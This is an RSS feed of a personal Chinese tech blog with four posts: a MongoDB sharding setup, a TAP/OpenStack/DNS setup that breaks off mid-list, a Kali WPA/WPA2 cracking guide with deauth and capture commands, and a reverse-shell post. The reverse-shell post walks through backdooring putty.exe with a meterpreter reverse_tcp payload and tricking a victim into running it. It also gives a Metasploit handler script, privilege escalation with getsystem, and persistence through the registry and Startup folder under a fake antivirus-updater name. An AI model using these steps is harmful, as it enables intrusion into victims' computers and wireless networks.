<?xml version="1.0" encoding="UTF-8"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>Yinan&#39;s Blog</title>
    <description>Welcome to geek&#39;s world!</description>
    <link>https://wuyinan0126.github.io/</link>
    <atom:link href="https://wuyinan0126.github.io/feed.xml" rel="self" type="application/rss+xml" />
    <pubDate>Wed, 01 Nov 2017 18:24:18 +0800</pubDate>
    <lastBuildDate>Wed, 01 Nov 2017 18:24:18 +0800</lastBuildDate>
    <generator>Jekyll v3.0.2</generator>
    
      <item>
        <title>&lt;font color=&#39;red&#39;&gt;[原创]&lt;/font&gt; 使用Kali破解WPA/WPA2 WiFi</title>
        <description>&lt;p&gt;**&lt;/p&gt;

&lt;h2 id=&quot;section&quot;&gt;使用密码表暴力破解&lt;/h2&gt;

&lt;ol&gt;
  &lt;li&gt;
    &lt;p&gt;检查无线适配器状态&lt;/p&gt;

    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; # iwconfig
 wlan0	IEEE 802.11  ESSID:off/any  
   		Mode:Managed  Access Point: Not-Associated   Tx-Power=20 dBm   
   		Retry short  long limit:2   RTS thr:off   Fragment thr:off
   		Encryption key:off
   		Power Management:off
&lt;/code&gt;&lt;/pre&gt;
    &lt;/div&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;[可选] 对于运行在virtual box中的虚拟机，需要执行以下命令&lt;/p&gt;

    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; # airmon-ng stop wlan0mon &amp;amp;&amp;amp; ifconfig wlan0 down &amp;amp;&amp;amp; macchanger -r wlan0 &amp;amp;&amp;amp; airmon-ng check kill &amp;amp;&amp;amp; ifconfig wlan0 up
&lt;/code&gt;&lt;/pre&gt;
    &lt;/div&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;kill掉可能会造成monitor模式错误的进程&lt;/p&gt;

    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; # airmon-ng check kill
 Killing these processes:
   PID Name
   563 dhclient
   841 wpa_supplicant
&lt;/code&gt;&lt;/pre&gt;
    &lt;/div&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;在wlan0开始monitor模式&lt;/p&gt;

    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; # airmon-ng start wlan0
 PHY		Interface	Driver		Chipset
 phy0	wlan0		rt2800usb	Ralink Technology, Corp. RT5372
 (mac80211 monitor mode vif enabled for [phy0]wlan0 on [phy0]wlan0mon)
 (mac80211 station mode vif disabled for [phy0]wlan0)
&lt;/code&gt;&lt;/pre&gt;
    &lt;/div&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;查看周围的AP和连接上AP的clients，保留运行这个命令的终端&lt;/p&gt;

    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; # airodump-ng wlan0mon
&lt;/code&gt;&lt;/pre&gt;
    &lt;/div&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;新开一个终端，监听特定频段和SSID的AP&lt;/p&gt;

    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; # airodump-ng -c 11 --bssid 70:F9:6D:64:B5:60 -w ~/test wlan0mon
&lt;/code&gt;&lt;/pre&gt;
    &lt;/div&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;将连上该AP的clients强制下线&lt;/p&gt;

    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; # aireplay-ng --deauth 10 -a 70:F9:6D:64:B5:60 wlan0mon
&lt;/code&gt;&lt;/pre&gt;
    &lt;/div&gt;
  &lt;/li&gt;
&lt;/ol&gt;
</description>
        <pubDate>Tue, 26 Sep 2017 23:13:23 +0800</pubDate>
        <link>https://wuyinan0126.github.io/2017/%E4%BD%BF%E7%94%A8Kali%E7%A0%B4%E8%A7%A3WPA-WPA2-WiFi/</link>
        <guid isPermaLink="true">https://wuyinan0126.github.io/2017/%E4%BD%BF%E7%94%A8Kali%E7%A0%B4%E8%A7%A3WPA-WPA2-WiFi/</guid>
        
        <category>原创</category>
        
        <category>技术宅</category>
        
        <category>Kali</category>
        
        
        <category>原创</category>
        
        <category>技术宅</category>
        
        <category>Kali</category>
        
      </item>
    
      <item>
        <title>&lt;font color=&#39;red&#39;&gt;[原创]&lt;/font&gt; 大数据学习笔记(9)-NoSQL</title>
        <description>&lt;p&gt;**&lt;/p&gt;

&lt;h2 id=&quot;nosql&quot;&gt;NoSQL&lt;/h2&gt;
&lt;hr /&gt;

&lt;hr /&gt;

&lt;hr /&gt;

&lt;h2 id=&quot;mongodb345&quot;&gt;安装MongoDB（版本3.4.5）&lt;/h2&gt;
&lt;hr /&gt;

&lt;h3 id=&quot;section&quot;&gt;分布式架构&lt;/h3&gt;
&lt;hr /&gt;

&lt;ul&gt;
  &lt;li&gt;mongos server2个：cat1:12600、cat2:12600&lt;/li&gt;
  &lt;li&gt;config server3个：cat1:12610、cat2:12610、cat3:12610&lt;/li&gt;
  &lt;li&gt;shard server10个（数据分10片，shard[1-10]），每个分片有3个副本集：
      * 主分片(primary)：cat[3-12]:12620
      * 一个副本(secondary)：cat[3-12]:12621
      * 一个仲裁(arbiter)：cat[3-12]:12622&lt;/li&gt;
  &lt;li&gt;分片和副本集规则：对于分片n(shard[n])，主分片存放在cat[n+2]:12620，副本存放cat[n+3]:12621，仲裁存放在cat[n+4]:12622&lt;/li&gt;
&lt;/ul&gt;

&lt;hr /&gt;

&lt;h3 id=&quot;section-1&quot;&gt;准备工作&lt;/h3&gt;
&lt;hr /&gt;

&lt;ol&gt;
  &lt;li&gt;
    &lt;p&gt;下载&lt;a href=&quot;https://www.mongodb.org/dl/linux/x86_64&quot;&gt;MongoDB二进制包&lt;/a&gt;，解压至/opt/:&lt;/p&gt;

    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; $ ansible all -m copy -a &#39;src=/home/cat/cat/archive/mongodb-linux-x86_64-ubuntu1404-v3.4-latest.tgz dest=/home/cat/cat/&#39;
 $ ansible all -a &#39;tar -zxvf /home/cat/cat/mongodb-linux-x86_64-ubuntu1404-v3.4-latest.tgz -C /opt/&#39;
 $ ansible all -a &#39;mv /opt/mongodb-linux-x86_64-ubuntu1404-3.4.5-45-gecfb3fb /opt/mongodb-3.4.5&#39;
&lt;/code&gt;&lt;/pre&gt;
    &lt;/div&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;创建MongoDB相关目录，mongos、config、primary、secondary、arbiter五个目录，因为mongos不存储数据，只需要建立日志文件目录即可:&lt;/p&gt;

    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; # 建立mongos server日志文件存放目录、config server的数据和日志存放目录
 $ ansible all -a &#39;mkdir -p /opt/mongodb-3.4.5/var/mongos/log /opt/mongodb-3.4.5/var/config/data /opt/mongodb-3.4.5/var/config/log&#39;
 # 建立副本集的数据文件和日志存放目录
 $ ansible all -a &#39;mkdir -p /opt/mongodb-3.4.5/var/primary/data /opt/mongodb-3.4.5/var/primary/log /opt/mongodb-3.4.5/var/secondary/data /opt/mongodb-3.4.5/var/secondary/log /opt/mongodb-3.4.5/var/arbiter/data /opt/mongodb-3.4.5/var/arbiter/log&#39;
&lt;/code&gt;&lt;/pre&gt;
    &lt;/div&gt;
  &lt;/li&gt;
&lt;/ol&gt;

&lt;hr /&gt;

&lt;h3 id=&quot;mongodb&quot;&gt;启动MongoDB&lt;/h3&gt;
&lt;hr /&gt;

&lt;ol&gt;
  &lt;li&gt;
    &lt;p&gt;在每个config server节点启动配置服务器。configReplSet为自定义副本集名称，接下来启动mongos也会用到该replSetName&lt;/p&gt;

    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; $ ansible zookeeper -a &#39;sudo /opt/mongodb-3.4.5/bin/mongod --configsvr --replSet configReplSet --dbpath /opt/mongodb-3.4.5/var/config/data --port 12610 --logpath /opt/mongodb-3.4.5/var/config/log/config.log --fork&#39;
&lt;/code&gt;&lt;/pre&gt;
    &lt;/div&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;连接到任意一台配置服务器上，初始化配置副本集&lt;/p&gt;

    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; $ mongo cat1:12610
 &amp;gt; rs.initiate({_id:&quot;configReplSet&quot;,configsvr:true,members:[{_id:0,host:&quot;10.2.2.141:12610&quot;},{_id:1,host:&quot;10.2.2.142:12610&quot;},{_id:2,host:&quot;10.2.2.143:12610&quot;}]})
 { &quot;ok&quot; : 1 }
&lt;/code&gt;&lt;/pre&gt;
    &lt;/div&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;在每个shard server节点配置10个分片的3个副本集，如第一个分片shard1，primary分片在cat3:12620，副本secondary在cat4:12621，仲裁arbiter在cat5:12622，以此类推&lt;/p&gt;

    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; cat@cat3 $ sudo /opt/mongodb-3.4.5/bin/mongod --shardsvr --replSet shard1 --port 12620 --dbpath /opt/mongodb-3.4.5/var/primary/data --logpath /opt/mongodb-3.4.5/var/primary/log/primary.log --fork --nojournal --oplogSize 1024

 cat@cat4 $ sudo /opt/mongodb-3.4.5/bin/mongod --shardsvr --replSet shard1 --port 12621 --dbpath /opt/mongodb-3.4.5/var/secondary/data --logpath /opt/mongodb-3.4.5/var/secondary/log/secondary.log --fork --nojournal --oplogSize 1024

 cat@cat5 $ sudo /opt/mongodb-3.4.5/bin/mongod --shardsvr --replSet shard1 --port 12622 --dbpath /opt/mongodb-3.4.5/var/arbiter/data --logpath /opt/mongodb-3.4.5/var/arbiter/log/arbiter.log --fork --nojournal --oplogSize 1024

 # 对于第一个shard1，在cat@cat3执行以下的命令即可
 sudo /opt/mongodb-3.4.5/bin/mongod --shardsvr --replSet shard1 --port 12620 --dbpath /opt/mongodb-3.4.5/var/primary/data --logpath /opt/mongodb-3.4.5/var/primary/log/primary.log --fork --nojournal --oplogSize 1024
 sudo /opt/mongodb-3.4.5/bin/mongod --shardsvr --replSet shard10 --port 12621 --dbpath /opt/mongodb-3.4.5/var/secondary/data --logpath /opt/mongodb-3.4.5/var/secondary/log/secondary.log --fork --nojournal --oplogSize 1024
 sudo /opt/mongodb-3.4.5/bin/mongod --shardsvr --replSet shard9 --port 12622 --dbpath /opt/mongodb-3.4.5/var/arbiter/data --logpath /opt/mongodb-3.4.5/var/arbiter/log/arbiter.log --fork --nojournal --oplogSize 1024
&lt;/code&gt;&lt;/pre&gt;
    &lt;/div&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;登陆每个shard server，初始化分片副本集配置&lt;/p&gt;

    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; $ mongo cat3:12620
 &amp;gt; use admin
 &amp;gt; rs.initiate({_id:&quot;shard1&quot;,members:[{_id:0,host:&quot;10.2.2.143:12620&quot;},{_id:1,host:&quot;10.2.2.144:12621&quot;},{_id:2,host:&quot;10.2.2.145:12622&quot;}]})

 $ mongo cat4:12620
 &amp;gt; use admin
 &amp;gt; rs.initiate({_id:&quot;shard2&quot;,members:[{_id:0,host:&quot;10.2.2.144:12620&quot;},{_id:1,host:&quot;10.2.2.145:12621&quot;},{_id:2,host:&quot;10.2.2.146:12622&quot;}]})

 ...
&lt;/code&gt;&lt;/pre&gt;
    &lt;/div&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;在每个mongos server节点分别启动mongos服务器&lt;/p&gt;

    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; $ ansible zookeeper -a &#39;sudo /opt/mongodb-3.4.5/bin/mongos --configdb configReplSet/10.2.2.141:12610,10.2.2.142:12610 --port 12600 --logpath /opt/mongodb-3.4.5/var/mongos/log/mongos.log --fork&#39;
&lt;/code&gt;&lt;/pre&gt;
    &lt;/div&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;连接到任意一台mongos服务器上，添加分片到集群&lt;/p&gt;

    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; $ mongo cat1:12600
 mongos&amp;gt; sh.addShard(&quot;shard1/10.2.2.143:12620,10.2.2.144:12621,10.2.2.145:12622&quot;)
 mongos&amp;gt; sh.addShard(&quot;shard2/10.2.2.144:12620,10.2.2.145:12621,10.2.2.146:12622&quot;)
 ...
&lt;/code&gt;&lt;/pre&gt;
    &lt;/div&gt;
  &lt;/li&gt;
&lt;/ol&gt;

&lt;h3 id=&quot;mongodb-1&quot;&gt;测试MongoDB&lt;/h3&gt;
&lt;hr /&gt;

&lt;hr /&gt;
</description>
        <pubDate>Thu, 22 Jun 2017 08:00:00 +0800</pubDate>
        <link>https://wuyinan0126.github.io/2017/%E5%A4%A7%E6%95%B0%E6%8D%AE%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0(9)-NoSQL/</link>
        <guid isPermaLink="true">https://wuyinan0126.github.io/2017/%E5%A4%A7%E6%95%B0%E6%8D%AE%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0(9)-NoSQL/</guid>
        
        <category>原创</category>
        
        <category>大数据</category>
        
        
        <category>原创</category>
        
        <category>大数据</category>
        
      </item>
    
      <item>
        <title>&lt;font color=&#39;red&#39;&gt;[原创]&lt;/font&gt; 反弹shell渗透</title>
        <description>&lt;p&gt;**&lt;/p&gt;

&lt;h2 id=&quot;shell&quot;&gt;反弹shell渗透&lt;/h2&gt;
&lt;hr /&gt;

&lt;ol&gt;
  &lt;li&gt;
    &lt;p&gt;下载一个二进制文件，如putty.exe，使用ResHacker加入管理员运行权限：&lt;/p&gt;

    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; &amp;lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; standalone=&quot;yes&quot;?&amp;gt;
 &amp;lt;!-- Copyright (c) Microsoft Corporation --&amp;gt;
 &amp;lt;assembly xmlns=&quot;urn:schemas-microsoft-com:asm.v1&quot;  xmlns:asmv3=&quot;urn:schemas-microsoft-com:asm.v3&quot; manifestVersion=&quot;1.0&quot;&amp;gt;
 &amp;lt;assemblyIdentity version=&quot;1.0.0.0&quot; processorArchitecture=&quot;x86&quot; name=&quot;Microsoft.Windows.MF.rrinstaller&quot; type=&quot;win32&quot;/&amp;gt;
 &amp;lt;trustInfo xmlns=&quot;urn:schemas-microsoft-com:asm.v3&quot;&amp;gt;
         &amp;lt;security&amp;gt;
             &amp;lt;requestedPrivileges&amp;gt;
                 &amp;lt;requestedExecutionLevel level=&quot;requireAdministrator&quot; uiAccess=&quot;false&quot;/&amp;gt;
             &amp;lt;/requestedPrivileges&amp;gt;
         &amp;lt;/security&amp;gt;
     &amp;lt;/trustInfo&amp;gt;
     &amp;lt;asmv3:application&amp;gt;
        &amp;lt;asmv3:windowsSettings xmlns=&quot;http://schemas.microsoft.com/SMI/2005/WindowsSettings&quot;&amp;gt;
             &amp;lt;autoElevate&amp;gt;true&amp;lt;/autoElevate&amp;gt;
        &amp;lt;/asmv3:windowsSettings&amp;gt;
     &amp;lt;/asmv3:application&amp;gt;
 &amp;lt;/assembly&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
    &lt;/div&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;使用shellter动态插入反弹shell代码，如为管理员运行权限的exe文件，则shellter也需管理员权限运行：&lt;/p&gt;

    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; Choose Operation Mode - Auto/Manual (A/M/H): A

 Perform Online Version Check? (Y/N/H): N

 PE Target: {exe文件路径}

 ************
 * Payloads *
 ************

 [1] Meterpreter_Reverse_TCP   [stager]
 [2] Meterpreter_Reverse_HTTP  [stager]
 [3] Meterpreter_Reverse_HTTPS [stager]
 [4] Meterpreter_Bind_TCP      [stager]
 [5] Shell_Reverse_TCP         [stager]
 [6] Shell_Bind_TCP            [stager]
 [7] WinExec

 Use a listed payload or custom? (L/C/H): L

 Select payload by index: 1

 ***************************
 * meterpreter_reverse_tcp *
 ***************************

 SET LHOST: {IP}

 SET LPORT: {PORT}
&lt;/code&gt;&lt;/pre&gt;
    &lt;/div&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;通过社会工程学的方法让victim运行该程序（管理员权限）&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;运行渗透脚本，开启监听：&lt;/p&gt;

    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; echo &#39;
 use exploit/multi/handler
 set payload windows/meterpreter/reverse_tcp
 set LHOST 0.0.0.0
 set LPORT 4444
 set EXITONSESSIONS false
 exploit -j
 &#39; &amp;gt; ./exploit.rc

 sudo msfconsole -r ./exploit.rc

 rm -rf ./exploit.rc
&lt;/code&gt;&lt;/pre&gt;
    &lt;/div&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;当victim接入后，在msfconsole中：&lt;/p&gt;

    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; msf exploit(handler) &amp;gt; [*] Sending stage (957487 bytes) to {VICTIM_IP}
 [*] Meterpreter session 1 opened ({VICTIM_IP}:4444 -&amp;gt; {VICTIM_IP}:50138) at ...

 msf exploit(handler) &amp;gt; sessions -i 1
 # 查看权限
 meterpreter &amp;gt; run post/windows/gather/win_privs 

 Current User
 ============

  Is Admin  Is System  Is In Local Admin Group  UAC Enabled  Foreground ID  UID
  --------  ---------  -----------------------  -----------  -------------  ---
  True      False      True                     True         1              &quot;&quot;

 meterpreter &amp;gt; getsystem 
 ...got system via technique 1 (Named Pipe Impersonation (In Memory/Admin)).

 Current User
 ============

  Is Admin  Is System  Is In Local Admin Group  UAC Enabled  Foreground ID  UID
  --------  ---------  -----------------------  -----------  -------------  ---
  True      True       True                     False        1              &quot;&quot;

 meterpreter &amp;gt; ls C:\\Users

 # 管理员运行权限的exe文件，注册表添加开机启动
 meterpreter &amp;gt; upload ./Secured.exe C:\\Users\\{USER}\\AppData\\Roaming\\Microsoft\\Windows\\病毒库更新程序.exe
 meterpreter &amp;gt; reg setval -k HKLM\\software\\microsoft\\windows\\currentversion\\run -v Secured -d &#39;C:\Users\{USER}\AppData\Roaming\Microsoft\Windows\病毒库更新程序.exe&#39;
	
 # 管理员运行权限的exe文件，开机启动项添加开机启动
 meterpreter &amp;gt; upload ./Secured.exe &quot;C:\\Users\\{USER}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\Secured.exe&quot;

 # 非管理员运行权限的exe文件，注册表添加开机启动
 meterpreter &amp;gt; upload ./Protected.exe C:\\Users\\{USER}\\Protected.exe
 meterpreter &amp;gt; reg setval -k HKLM\\software\\microsoft\\windows\\currentversion\\run -v Protected -d &#39;C:\Users\{USER}\Protected.exe&#39;

 # 非管理员运行权限的exe文件，开机启动项添加开机启动
 meterpreter &amp;gt; upload ./Protected.exe &quot;C:\\Users\\{USER}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\Protected.exe&quot;
&lt;/code&gt;&lt;/pre&gt;
    &lt;/div&gt;
  &lt;/li&gt;
&lt;/ol&gt;

&lt;hr /&gt;

&lt;p&gt;&lt;strong&gt;未完待续&lt;/strong&gt;&lt;/p&gt;
</description>
        <pubDate>Wed, 03 May 2017 08:00:00 +0800</pubDate>
        <link>https://wuyinan0126.github.io/2017/%E5%8F%8D%E5%BC%B9shell%E6%B8%97%E9%80%8F/</link>
        <guid isPermaLink="true">https://wuyinan0126.github.io/2017/%E5%8F%8D%E5%BC%B9shell%E6%B8%97%E9%80%8F/</guid>
        
        <category>原创</category>
        
        <category>技术宅</category>
        
        
        <category>原创</category>
        
        <category>技术宅</category>
        
      </item>
    
      <item>
        <title>&lt;font color=&#39;red&#39;&gt;[原创]&lt;/font&gt; TAP平台搭建和使用笔记</title>
        <description>&lt;p&gt;&lt;em&gt;在OpenStack上搭建和使用Trusted Analytics Platform，包括OpenStack的搭建、本地DNS服务的搭建、本地代理服务器的搭建、疑难问题的筛查和解决&lt;/em&gt;&lt;/p&gt;

&lt;h2 id=&quot;tap&quot;&gt;TAP平台&lt;/h2&gt;
&lt;hr /&gt;

&lt;p&gt;TAP是由Intel开发的一款开源软件，它可以加速创建以大数据分析为驱动的本地云应用。它通过在公有云和私有云提供一个分享的、灵活的数据分析环境，使得企业的开发者、数据科学家、云服务提供商和系统集成商更容易地合作&lt;/p&gt;

&lt;p&gt;TAP是一个多租户的平台，旨在简化和加速端到端的分析应用程序的交付。它采用松耦合的分层架构，使得在定制解决方式时具有较大的灵活性。它由数据层(Data Layer)、分析层(Analytics Layer)和应用层(Application Layer)构成，如下图所示：&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/2017-03-09-1.png&quot; alt=&quot;TAP架构图&quot; title=&quot;TAP架构图&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;openstack&quot;&gt;OpenStack搭建&lt;/h2&gt;
&lt;hr /&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;TAP的OpenStack版本要求：Mirantis Opentack 7.0 for Kilo 2015.1.0&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;TAP的硬件要求：
    &lt;ul&gt;
      &lt;li&gt;1个fuel server: 4核CPU，4GB内存，1 Gbps以太网，128GB SAS硬盘&lt;/li&gt;
      &lt;li&gt;1个Controller节点: 2个6核CPU，24GB内存，1TB RAID1&lt;/li&gt;
      &lt;li&gt;1个Storage节点: 1个4核CPU，12GB内存，500GB RAID1&lt;/li&gt;
      &lt;li&gt;6个Compute节点（每个）:双socket CPU，每个socket至少4核，64GB内存，256GB SSD&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;实际硬件：
    &lt;ul&gt;
      &lt;li&gt;1个fuel server: 双网口，网口1配置VLAN&lt;/li&gt;
      &lt;li&gt;1个Controller + Cinder Storage节点：双网口，网口1配置VLAN，2个8核CPU，48GB内存，900GB SATA&lt;/li&gt;
      &lt;li&gt;4个Compute + Cinder Storage节点（每个）：双网口，网口1配置VLAN，4个16核CPU，128G内存，0.8~3.6TB RAID5&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;网络配置：
    &lt;ul&gt;
      &lt;li&gt;公开：
        &lt;ul&gt;
          &lt;li&gt;IP范围：10.2.14.3～10.2.14.21&lt;/li&gt;
          &lt;li&gt;CIDR：10.2.14.0/24&lt;/li&gt;
          &lt;li&gt;不使用VLAN标记&lt;/li&gt;
          &lt;li&gt;网关：10.2.14.1&lt;/li&gt;
          &lt;li&gt;Floating IP范围：10.2.14.22～10.2.14.79&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
      &lt;li&gt;存储：
        &lt;ul&gt;
          &lt;li&gt;VLAN：991&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
      &lt;li&gt;管理：
        &lt;ul&gt;
          &lt;li&gt;VLAN：992&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
      &lt;li&gt;Neutron L2配置：
        &lt;ul&gt;
          &lt;li&gt;VLAN ID 范围：993～999&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;OpenStack配置：
    &lt;ul&gt;
      &lt;li&gt;Repositories：修改ubuntu的软件源（如阿里云的源）：http://mirrors.aliyun.com/ubuntu/&lt;/li&gt;
      &lt;li&gt;Public network assignment：给所有节点分配所有public网络&lt;/li&gt;
      &lt;li&gt;Storage：Cinder LVM over iSCSI for volumes&lt;/li&gt;
      &lt;li&gt;Public TLS：不使用HTTPS和TLS&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;dns&quot;&gt;本地DNS服务的搭建&lt;/h2&gt;
&lt;hr /&gt;

&lt;p&gt;由于TAP平台需要TAP Domain，之前使用xip.io不稳定且解析速度慢，因此搭建本地DNS服务器（IP为10.2.3.114）。我的TAP Domain为tap.wyn，需要将所有子域名解析为10.2.14.28&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;建立Ubuntu Server虚拟机&lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;安装bind9：&lt;/p&gt;

    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; $ sudo apt-get install bind9
&lt;/code&gt;&lt;/pre&gt;
    &lt;/div&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;添加一个zone：&lt;/p&gt;

    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; $ sudo cp /etc/bind/db.local /etc/bind/db.tap.wyn
&lt;/code&gt;&lt;/pre&gt;
    &lt;/div&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;修改/etc/bind/named.conf.local：&lt;/p&gt;

    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; zone &quot;tap.wyn&quot; {
   type master;
   file &quot;/etc/bind/db.tap.wyn&quot;;
 };
&lt;/code&gt;&lt;/pre&gt;
    &lt;/div&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;修改/etc/bind/db.tap.wyn：&lt;/p&gt;

    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; $TTL    604800
 @       IN      SOA     tap.wyn. root.tap.wyn. (
                               2         ; Serial
                          604800         ; Refresh
                           86400         ; Retry
                         2419200         ; Expire
                          604800 )       ; Negative Cache TTL
 ;
 @       IN      NS      10.2.3.114.		# 替换为你的本地dns服务器（即本机）地址
 @       IN      A       10.2.14.28		# 使其能解析tap.wyn为10.2.14.28
 *       IN      A       10.2.14.28		# 使其能解析*.tap.wyn为10.2.14.28
&lt;/code&gt;&lt;/pre&gt;
    &lt;/div&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;修改/etc/bind/named.conf.options：&lt;/p&gt;

    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; options {
         directory &quot;/var/cache/bind&quot;;
         forwarders {				# 本地解析不了时，给以下DNS服务器解析
                 202.112.128.51;
                 114.114.114.114;
                 0.0.0.0;
         };
         dnssec-validation auto;
         auth-nxdomain no;    
         listen-on-v6 { any; };
         allow-query { any; };			# 允许任何主机用该DNS服务器查询
 };
&lt;/code&gt;&lt;/pre&gt;
    &lt;/div&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;编写开机启动脚本：&lt;/p&gt;

    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; sudo /etc/init.d/bind9 restart
&lt;/code&gt;&lt;/pre&gt;
    &lt;/div&gt;
  &lt;/li&gt;
  &lt;li&gt;测试：
    &lt;ul&gt;
      &lt;li&gt;
        &lt;p&gt;修改本机/etc/resolv.conf，在所有nameserver上加入：&lt;/p&gt;

        &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;  nameserver 10.2.3.114			# 替换为你的本地dns服务器（即本机）地址
&lt;/code&gt;&lt;/pre&gt;
        &lt;/div&gt;
      &lt;/li&gt;
      &lt;li&gt;
        &lt;p&gt;测试：&lt;/p&gt;

        &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;  $ host tap.wyn
  $ host a.tap.wyn
  $ host baidu.com
&lt;/code&gt;&lt;/pre&gt;
        &lt;/div&gt;
      &lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ol&gt;

&lt;h2 id=&quot;section&quot;&gt;本地代理服务的搭建&lt;/h2&gt;
&lt;hr /&gt;

&lt;p&gt;由于TAP平台需要从国外软件源下载依赖包，并且TAP平台只支持HTTP和HTTPS代理。目前国内的代理提供商已经不提供HTTP代理，因为其流量能被监视，因此需要将其他代理协议，如ShadowSocks，转为HTTP代理，因此搭建本地代理服务器（IP为10.2.3.111）&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;建立Ubuntu Server虚拟机&lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;安装shadowsocks：&lt;/p&gt;

    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; $ sudo pip install shadowsocks
&lt;/code&gt;&lt;/pre&gt;
    &lt;/div&gt;
  &lt;/li&gt;
  &lt;li&gt;
